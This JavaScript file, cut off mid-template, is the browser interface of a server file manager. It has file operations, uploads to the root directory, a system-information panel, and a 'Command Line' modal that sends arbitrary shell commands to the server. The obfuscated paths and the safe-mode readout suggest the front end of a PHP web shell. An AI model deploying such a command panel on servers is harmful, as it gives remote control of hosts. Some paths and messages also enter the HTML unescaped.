let alertCounter = 0;

function showAlert(message, type) {
    const alertContainer = document.getElementById('alertContainer');
    const alertId = `alert-${alertCounter++}`;

    const alertClass = type === 'success' ? 'alert-success' : 'alert-error';
    const iconPath = type === 'success'
        ? '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>'
        : '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>';

    const alertElement = document.createElement('div');
    alertElement.className = `alert ${alertClass}`;
    alertElement.id = alertId;

    alertElement.innerHTML = `
        <div class="flex items-center">
            <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                ${iconPath}
            </svg>
            <div>${message}</div>
        </div>
        <span class="close-alert" onclick="closeAlert('${alertId}')">&times;</span>
    `;

    alertContainer.appendChild(alertElement);

    setTimeout(() => {
        closeAlert(alertId);
    }, 5000);
}

function closeAlert(alertId) {
    const alertElement = document.getElementById(alertId);
    if (alertElement) {
        alertElement.style.animation = 'fadeOut 0.3s ease-out';
        setTimeout(() => {
            alertElement.remove();
        }, 300);
    }
}

const Modal = {
    element: null,
    content: null,
    currentAction: null,

    init() {
        this.element = document.getElementById('actionModal');
        this.content = document.getElementById('modalContent');
    },

    open(html, size = '') {
        if (!this.element) this.init();
        this.content.innerHTML = html;
        this.content.className = 'modal-content ' + size;
        this.element.style.display = 'block';
        document.body.style.overflow = 'hidden';

        const closeBtns = this.content.querySelectorAll('[data-modal-close]');
        closeBtns.forEach(btn => {
            btn.addEventListener('click', () => this.close());
        });

        const forms = this.content.querySelectorAll('form[data-ajax]');
        forms.forEach(form => {
            form.addEventListener('submit', (e) => this.handleSubmit(e));
        });
    },

    close() {
        if (!this.element) this.init();
        this.element.style.display = 'none';
        this.content.innerHTML = '';
        document.body.style.overflow = '';
        this.currentAction = null;
    },

    setLoading(button, loading = true) {
        if (loading) {
            button.dataset.originalHtml = button.innerHTML;
            button.innerHTML = `
                <svg class="animate-spin" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" style="width: 18px; height: 18px;">
                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                <span>Processing...</span>
            `;
            button.disabled = true;
        } else {
            button.innerHTML = button.dataset.originalHtml || button.innerHTML;
            button.disabled = false;
        }
    },

    handleSubmit(e) {
        e.preventDefault();
        const form = e.target;
        const button = form.querySelector('button[type="submit"]');
        const formData = new FormData(form);

        this.setLoading(button, true);

        fetch(window.location.href, {
            method: 'POST',
            body: formData
        })
            .then(response => {
                if (!response.ok) throw new Error('HTTP error! status: ' + response.status);
                return response.json();
            })
            .then(data => {
                this.close();
                if (data.success) {
                    if (data.fileTableHtml) {
                        document.getElementById('file-manager-content').innerHTML = data.fileTableHtml;
                        initSearch();
                    }
                    showAlert(data.message, 'success');
                } else {
                    showAlert(data.message || 'Action failed', 'error');
                }
            })
            .catch(error => {
                this.setLoading(button, false);
                showAlert('Error: ' + error.message, 'error');
            });
    }
};

window.addEventListener('click', function (event) {
    if (!Modal.element) Modal.init();
    if (event.target === Modal.element) {
        Modal.close();
    }
});

document.addEventListener('keydown', function (event) {
    if (!Modal.element) Modal.init();
    if (event.key === 'Escape' && Modal.element.style.display === 'block') {
        Modal.close();
    }
});

function showDeleteModal(filename, filePath, isDirectory) {
    const html = `
        <div class="modal-header">
            <h2 class="text-xl font-bold text-error flex items-center gap-3">
                <svg class="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
                </svg>
                <span>Delete ${isDirectory ? 'Directory' : 'File'}</span>
            </h2>
        </div>
        <div class="modal-body">
            <p class="text-on-surface mb-4">Are you sure you want to delete <strong>"${escapeHtml(filename)}"</strong>? This action cannot be undone.</p>
            ${isDirectory ? `
            <div class="p-4 bg-surface-container-high border border-error rounded-xl text-error flex items-start gap-3">
                <svg class="h-5 w-5 flex-shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
                </svg>
                <span class="text-sm">Warning: This will recursively delete all contents of the directory!</span>
            </div>
            ` : ''}
        </div>
        <div class="modal-footer">
            <button type="button" class="btn btn-danger" onclick="confirmDelete('${filePath}')">
                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
                </svg>
                <span>Delete</span>
            </button>
            <button type="button" class="btn btn-secondary" data-modal-close>
                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                </svg>
                <span>Cancel</span>
            </button>
        </div>
    `;
    Modal.open(html);
    Modal.currentAction = { type: 'delete', filePath };
}

function confirmDelete(filePath) {
    const button = Modal.content.querySelector('.btn-danger');
    Modal.setLoading(button, true);

    fetch(window.location.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'ajax_delete=1&path=' + encodeURIComponent(filePath)
    })
        .then(response => {
            if (!response.ok) throw new Error('HTTP error! status: ' + response.status);
            return response.json();
        })
        .then(data => {
            Modal.close();
            if (data.success) {
                document.getElementById('file-manager-content').innerHTML = data.fileTableHtml;
                initSearch();
                showAlert(data.message, 'success');
            } else {
                showAlert('Failed to delete: ' + data.message, 'error');
            }
        })
        .catch(error => {
            Modal.setLoading(button, false);
            showAlert('Error: ' + error.message, 'error');
        });
}

function showRenameModal(filename, filePath, isDirectory) {
    const html = `
        <form data-ajax method="post">
            <input type="hidden" name="ajax_rename" value="1">
            <input type="hidden" name="path" value="${filePath}">
            <div class="modal-header">
                <h2 class="text-xl font-bold text-primary flex items-center gap-3">
                    <svg class="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path>
                    </svg>
                    <span>Rename ${isDirectory ? 'Directory' : 'File'}</span>
                </h2>
            </div>
            <div class="modal-body">
                <div class="info-box">
                    <div class="info-box-row">
                        <span class="info-box-label">Current name:</span>
                        <span class="info-box-value mono">${escapeHtml(filename)}</span>
                    </div>
                </div>
                <div class="form-group">
                    <label class="form-label">New Name</label>
                    <input type="text" name="newname" value="${escapeHtml(filename)}" class="form-input" required autofocus>
                </div>
            </div>
            <div class="modal-footer">
                <button type="submit" class="btn btn-primary">
                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
                    </svg>
                    <span>Rename</span>
                </button>
                <button type="button" class="btn btn-secondary" data-modal-close>
                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                    </svg>
                    <span>Cancel</span>
                </button>
            </div>
        </form>
    `;
    Modal.open(html);
}

function showChmodModal(filename, filePath, currentPerms, isDirectory) {
    const html = `
        <form data-ajax method="post">
            <input type="hidden" name="ajax_chmod" value="1">
            <input type="hidden" name="path" value="${filePath}">
            <div class="modal-header">
                <h2 class="text-xl font-bold text-primary flex items-center gap-3">
                    <svg class="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                    </svg>
                    <span>Change Permissions</span>
                </h2>
            </div>
            <div class="modal-body">
                <div class="info-box">
                    <div class="info-box-row">
                        <span class="info-box-label">File:</span>
                        <span class="info-box-value mono" style="max-width: 200px; overflow: hidden; text-overflow: ellipsis;">${escapeHtml(filename)}</span>
                    </div>
                    <div class="info-box-row" style="margin-top: 8px;">
                        <span class="info-box-label">Current:</span>
                        <span class="info-box-value mono text-primary">${currentPerms}</span>
                    </div>
                </div>
                <div class="form-group">
                    <label class="form-label">New Permissions (octal)</label>
                    <input type="text" name="permission" value="${currentPerms}" class="form-input mono" required pattern="[0-7]{3,4}" placeholder="e.g. 0755" maxlength="4">
                    <p class="form-hint">Enter 3 or 4 digit octal notation (e.g., 0755 for directories, 0644 for files)</p>
                </div>
                <div class="p-4 bg-surface-container-high border border-outline-variant rounded-xl">
                    <p class="font-semibold text-on-surface mb-2" style="font-size: 13px;">Common permissions:</p>
                    <div class="space-y-1" style="font-size: 13px;">
                        <div class="flex items-center justify-between">
                            <span class="mono text-primary bg-surface px-2 py-0.5 rounded" style="font-size: 12px;">0755</span>
                            <span class="text-on-surface-variant">Directory (drwxr-xr-x)</span>
                        </div>
                        <div class="flex items-center justify-between">
                            <span class="mono text-primary bg-surface px-2 py-0.5 rounded" style="font-size: 12px;">0644</span>
                            <span class="text-on-surface-variant">File (-rw-r--r--)</span>
                        </div>
                        <div class="flex items-center justify-between">
                            <span class="mono text-primary bg-surface px-2 py-0.5 rounded" style="font-size: 12px;">0777</span>
                            <span class="text-on-surface-variant">Full access</span>
                        </div>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <button type="submit" class="btn btn-primary">
                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
                    </svg>
                    <span>Change</span>
                </button>
                <button type="button" class="btn btn-secondary" data-modal-close>
                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                    </svg>
                    <span>Cancel</span>
                </button>
            </div>
        </form>
    `;
    Modal.open(html);
}

function showNewFileModal(dirPath) {
    const html = `
        <form data-ajax method="post" class="modal-form">
            <input type="hidden" name="ajax_newfile" value="1">
            <input type="hidden" name="path" value="${dirPath}">
            <div class="modal-header">
                <h2 class="text-xl font-bold text-primary flex items-center gap-3">
                    <svg class="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v3m0 0v3m0-3h3m-3 0H9m12 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                    </svg>
                    <span>Create New File</span>
                </h2>
            </div>
            <div class="modal-body">
                <div class="form-group">
                    <label class="form-label">Filename</label>
                    <input type="text" name="filename" class="form-input" placeholder="Enter filename (e.g., script.php)" required autofocus>
                </div>
                <div class="form-group">
                    <label class="form-label">Content</label>
                    <textarea name="content" class="form-textarea" rows="10" placeholder="Enter file content here..."></textarea>
                </div>
            </div>
            <div class="modal-footer">
                <button type="submit" class="btn btn-primary">
                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
                    </svg>
                    <span>Create</span>
                </button>
                <button type="button" class="btn btn-secondary" data-modal-close>
                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                    </svg>
                    <span>Cancel</span>
                </button>
            </div>
        </form>
    `;
    Modal.open(html, 'modal-lg');
}

function showNewFolderModal(dirPath) {
    const html = `
        <form data-ajax method="post">
            <input type="hidden" name="ajax_newfolder" value="1">
            <input type="hidden" name="path" value="${dirPath}">
            <div class="modal-header">
                <h2 class="text-xl font-bold text-primary flex items-center gap-3">
                    <svg class="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 13h6m-3-3v6m-9-6h.01M19 13h.01M19 19h.01M5 19h.01M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
                    </svg>
                    <span>Create New Folder</span>
                </h2>
            </div>
            <div class="modal-body">
                <div class="form-group">
                    <label class="form-label">Folder Name</label>
                    <input type="text" name="foldername" class="form-input" placeholder="Enter folder name" required autofocus>
                </div>
            </div>
            <div class="modal-footer">
                <button type="submit" class="btn btn-primary">
                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
                    </svg>
                    <span>Create</span>
                </button>
                <button type="button" class="btn btn-secondary" data-modal-close>
                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                    </svg>
                    <span>Cancel</span>
                </button>
            </div>
        </form>
    `;
    Modal.open(html);
}

function showCommandModal(encryptedPath) {
    const html = `
        <form method="post" id="commandForm">
            <input type="hidden" name="ajax_command" value="1">
            <input type="hidden" name="path" value="${escapeHtml(encryptedPath)}">
            <div class="modal-header">
                <h2 class="text-xl font-bold text-primary flex items-center gap-3">
                    <svg class="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
                    </svg>
                    <span>Command Line</span>
                </h2>
            </div>
            <div class="modal-body">
                <div class="form-group" style="margin-bottom: 16px;">
                    <label class="form-label">Command</label>
                    <div style="position: relative;">
                        <span style="position: absolute; left: 16px; top: 50%; transform: translateY(-50%); color: var(--primary); font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-weight: bold; font-size: 14px;">$</span>
                        <input type="text" name="command" class="form-input" style="padding-left: 36px; font-family: ui-monospace, SFMono-Regular, Menlo, monospace;" placeholder="Enter command (e.g., ls -la)" required autofocus autocomplete="off">
                    </div>
                </div>
                <div id="commandOutputContainer" style="display: none;">
                    <label class="form-label" style="display: flex; justify-content: space-between; align-items: center;">
                        <span>Output</span>
                        <span style="font-size: 11px; color: var(--on-surface-variant); font-weight: normal;">Scrollable</span>
                    </label>
                    <pre id="commandOutputPre" style="background-color: var(--surface-container-highest); color: var(--primary); padding: 16px; border-radius: 12px; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 12px; line-height: 1.5; overflow: auto; max-height: 350px; margin: 0; white-space: pre-wrap; word-break: break-word;"></pre>
                </div>
            </div>
            <div class="modal-footer">
                <button type="submit" class="btn btn-primary" id="cmdExecuteBtn">
                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" style="width: 18px; height: 18px;">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
                    </svg>
                    <span>Execute</span>
                </button>
                <button type="button" class="btn btn-secondary" data-modal-close>
                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" style="width: 18px; height: 18px;">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                    </svg>
                    <span>Close</span>
                </button>
            </div>
        </form>
    `;
    Modal.open(html, 'modal-lg');

    const form = document.getElementById('commandForm');
    const outputContainer = document.getElementById('commandOutputContainer');
    const outputPre = document.getElementById('commandOutputPre');
    const executeBtn = document.getElementById('cmdExecuteBtn');

    form.addEventListener('submit', function (e) {
        e.preventDefault();

        const formData = new FormData(form);
        const command = formData.get('command');

        if (!command || !command.trim()) {
            showAlert('Please enter a command', 'error');
            return;
        }

        Modal.setLoading(executeBtn, true);
        outputContainer.style.display = 'block';
        outputPre.textContent = 'Executing...';
        outputPre.style.color = 'var(--primary)';

        const params = new URLSearchParams();
        params.append('ajax_command', '1');
        params.append('path', encryptedPath);
        params.append('command', command);

        fetch(window.location.href, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: params.toString()
        })
            .then(response => {
                if (!response.ok) {
                    throw new Error('HTTP error! status: ' + response.status);
                }
                return response.json();
            })
            .then(data => {
                Modal.setLoading(executeBtn, false);
                if (data.success) {
                    const output = data.output !== undefined && data.output !== null && data.output !== ''
                        ? data.output
                        : '(Command executed with no output)';
                    outputPre.textContent = output;
                    outputPre.style.color = 'var(--primary)';
                } else {
                    outputPre.textContent = 'Error: ' + (data.message || 'Command failed');
                    outputPre.style.color = 'var(--error)';
                }
                outputPre.scrollTop = outputPre.scrollHeight;
            })
            .catch(error => {
                Modal.setLoading(executeBtn, false);
                outputContainer.style.display = 'block';
                outputPre.textContent = 'Error: ' + error.message;
                outputPre.style.color = 'var(--error)';
            });
    });
}

function showUploadModal(encryptedPath) {
    const html = `
        <form id="uploadForm" enctype="multipart/form-data">
            <div class="modal-header">
                <h2 class="text-xl font-bold text-primary flex items-center gap-3">
                    <svg class="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12"></path>
                    </svg>
                    <span>Upload File</span>
                </h2>
            </div>
            <div class="modal-body">
                <div class="form-group" style="margin-bottom: 20px;">
                    <label class="form-label">Upload to</label>
                    <div style="display: flex; gap: 20px; margin-top: 10px;">
                        <label style="display: flex; align-items: center; gap: 8px; cursor: pointer; font-size: 14px; color: var(--on-surface);">
                            <input type="radio" name="upload_to_root" value="0" checked style="accent-color: var(--primary); width: 16px; height: 16px; cursor: pointer;">
                            <span>Current directory</span>
                        </label>
                        <label style="display: flex; align-items: center; gap: 8px; cursor: pointer; font-size: 14px; color: var(--on-surface);">
                            <input type="radio" name="upload_to_root" value="1" style="accent-color: var(--primary); width: 16px; height: 16px; cursor: pointer;">
                            <span>Root directory</span>
                        </label>
                    </div>
                </div>
                <div class="form-group" style="margin-bottom: 20px;">
                    <label class="form-label">Select File</label>
                    <div id="fileUploadArea" style="border: 2px dashed var(--outline-variant); border-radius: 12px; padding: 32px 24px; cursor: pointer; background: var(--surface-container-lowest); transition: all 0.2s; margin-top: 10px; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 12px;">
                        <input type="file" id="uploadFile" name="file" required style="display: none;">
                        <svg style="width: 40px; height: 40px; color: var(--primary);" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"></path>
                        </svg>
                        <div style="color: var(--on-surface); font-size: 14px; font-weight: 500;">Click to select file</div>
                        <div id="selectedFileName" style="color: var(--primary); font-size: 13px; font-weight: 600; display: none; margin-top: 4px;"></div>
                    </div>
                </div>
                <div id="uploadProgress" style="display: none;">
                    <div style="background: var(--surface-container-highest); border-radius: 12px; padding: 16px; text-align: center; color: var(--primary); font-size: 14px;">
                        <div style="display: flex; align-items: center; justify-content: center; gap: 8px;">
                            <svg class="animate-spin" style="width: 16px; height: 16px;" fill="none" viewBox="0 0 24 24">
                                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                            </svg>
                            <span>Uploading...</span>
                        </div>
                    </div>
                </div>
                <div id="uploadResult" style="display: none;"></div>
            </div>
            <div class="modal-footer">
                <button type="submit" id="uploadSubmitBtn" class="btn btn-primary">
                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" style="width: 18px; height: 18px;">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12"></path>
                    </svg>
                    <span>Upload</span>
                </button>
                <button type="button" class="btn btn-secondary" data-modal-close>
                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" style="width: 18px; height: 18px;">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                    </svg>
                    <span>Close</span>
                </button>
            </div>
        </form>
    `;
    Modal.open(html);

    const form = document.getElementById('uploadForm');
    const progress = document.getElementById('uploadProgress');
    const result = document.getElementById('uploadResult');
    const submitBtn = document.getElementById('uploadSubmitBtn');
    const fileInput = document.getElementById('uploadFile');
    const fileUploadArea = document.getElementById('fileUploadArea');
    const selectedFileName = document.getElementById('selectedFileName');

    fileUploadArea.addEventListener('click', function () {
        fileInput.click();
    });

    fileInput.addEventListener('change', function () {
        if (this.files && this.files[0]) {
            selectedFileName.textContent = this.files[0].name;
            selectedFileName.style.display = 'block';
            fileUploadArea.style.borderColor = 'var(--primary)';
            fileUploadArea.style.background = 'var(--primary-container)';
        }
    });

    fileUploadArea.addEventListener('dragover', function (e) {
        e.preventDefault();
        this.style.borderColor = 'var(--primary)';
        this.style.background = 'var(--primary-container)';
    });

    fileUploadArea.addEventListener('dragleave', function (e) {
        e.preventDefault();
        if (!fileInput.files || !fileInput.files[0]) {
            this.style.borderColor = 'var(--outline-variant)';
            this.style.background = 'var(--surface-container-lowest)';
        }
    });

    fileUploadArea.addEventListener('drop', function (e) {
        e.preventDefault();
        const files = e.dataTransfer.files;
        if (files.length > 0) {
            fileInput.files = files;
            selectedFileName.textContent = files[0].name;
            selectedFileName.style.display = 'block';
            this.style.borderColor = 'var(--primary)';
            this.style.background = 'var(--primary-container)';
        }
    });

    form.addEventListener('submit', function (e) {
        e.preventDefault();

        const formData = new FormData(form);
        formData.append('ajax_upload', '1');
        formData.append('path', encryptedPath);

        progress.style.display = 'block';
        result.style.display = 'none';
        submitBtn.disabled = true;

        fetch(window.location.href, {
            method: 'POST',
            body: formData
        })
            .then(response => response.json())
            .then(data => {
                progress.style.display = 'none';
                submitBtn.disabled = false;

                if (data.success) {
                    Modal.close();
                    showAlert(data.message, 'success');
                    if (data.fileTableHtml) {
                        document.getElementById('file-manager-content').innerHTML = data.fileTableHtml;
                        initSearch();
                    } else {
                        window.location.reload();
                    }
                } else {
                    result.innerHTML = `<div style="background: var(--error-container); color: var(--on-error-container); padding: 12px; border-radius: 8px; font-size: 14px;">${escapeHtml(data.message)}</div>`;
                    result.style.display = 'block';
                    showAlert(data.message, 'error');
                }
            })
            .catch(error => {
                progress.style.display = 'none';
                submitBtn.disabled = false;
                result.innerHTML = `<div style="background: var(--error-container); color: var(--on-error-container); padding: 12px; border-radius: 8px; font-size: 14px;">Error: ${escapeHtml(error.message)}</div>`;
                result.style.display = 'block';
                showAlert('Upload failed: ' + error.message, 'error');
            });
    });
}

function showInfoModal() {
    const html = `
        <div class="modal-header">
            <h2 class="text-xl font-bold text-primary flex items-center gap-3">
                <svg class="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                </svg>
                <span>System Information</span>
            </h2>
        </div>
        <div class="modal-body">
            <div id="infoContent" style="display: flex; align-items: center; justify-content: center; min-height: 200px;">
                <div style="color: var(--on-surface-variant);">Loading...</div>
            </div>
        </div>
        <div class="modal-footer">
            <button type="button" class="btn btn-secondary" data-modal-close>
                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" style="width: 18px; height: 18px;">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                </svg>
                <span>Close</span>
            </button>
        </div>
    `;
    Modal.open(html, 'modal-lg');

    const infoContent = document.getElementById('infoContent');
    const baseUrl = window.location.pathname;

    fetch(baseUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'ajax_info=1'
    })
        .then(response => response.text())
        .then(text => {
            try {
                const data = JSON.parse(text);
                if (data.success) {
                    const info = data.info;
                    infoContent.innerHTML = `
                <div style="width: 100%; max-height: 400px; overflow-y: auto;">
                    <div style="display: grid; gap: 16px;">
                        <div style="background: var(--surface-container-highest); border-radius: 12px; padding: 16px;">
                            <div style="font-weight: 600; color: var(--primary); margin-bottom: 12px; font-size: 14px;">PHP</div>
                            <div style="display: grid; gap: 8px; font-size: 13px;">
                                <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Version</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.php.version)}</span></div>
                                <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">SAPI</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.php.sapi)}</span></div>
                                <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Safe Mode</span><span style="color: ${info.php.safe_mode === 'On' ? 'var(--error)' : 'var(--success)'}; font-family: monospace;">${escapeHtml(info.php.safe_mode)}</span></div>
                                <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Memory Limit</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.php.memory_limit)}</span></div>
                                <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Max Execution</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.php.max_execution_time)}s</span></div>
                                <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Upload Max</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.php.upload_max_filesize)}</span></div>
                                <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Post Max</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.php.post_max_size)}</span></div>
                            </div>
                        </div>
                        <div style="background: var(--surface-container-highest); border-radius: 12px; padding: 16px;">
                            <div style="font-weight: 600; color: var(--primary); margin-bottom: 12px; font-size: 14px;">System</div>
                            <div style="display: grid; gap: 8px; font-size: 13px;">
                                <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">OS</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.system.os)} (${escapeHtml(info.system.os_family)})</span></div>
                                <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Kernel</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.system.kernel)}</span></div>
                                <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Hostname</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.system.hostname)}</span></div>
                                <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">User</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.system.current_user)}</span></div>
                                <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Temp Dir</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.system.temp_dir)}</span></div>
                            </div>
                        </div>
                        <div style="background: var(--surface-container-highest); border-radius: 12px; padding: 16px;">
                            <div style="font-weight: 600; color: var(--primary); margin-bottom: 12px; font-size: 14px;">Server</div>
                            <div style="display: grid; gap: 8px; font-size: 13px;">
                                <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Software</span><span style="color: var(--on-surface); font-family: monospace; text-align: right; max-width: 60%; word-break: break-word;">${escapeHtml(info.server.software)}</span></div>
                                <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Server Name</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.server.name)}</span></div>
                                <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Document Root</span><span style="color: var(--on-surface); font-family: monospace; text-align: right; max-width: 60%; word-break: break-word;">${escapeHtml(info.server.document_root)}</span></div>
                                <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Remote IP</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.server.remote_addr)}</span></div>
                                <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Server IP</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.server.server_addr)}</span></div>
                            </div>
                        </div>
                        <div style="background: var(--surface-container-highest); border-radius: 12px; padding: 16px;">
                            <div style="font-weight: 600; color: var(--primary); margin-bottom: 12px; font-size: 14px;">Storage</div>
                            <div style="display: grid; gap: 8px; font-size: 13px;">
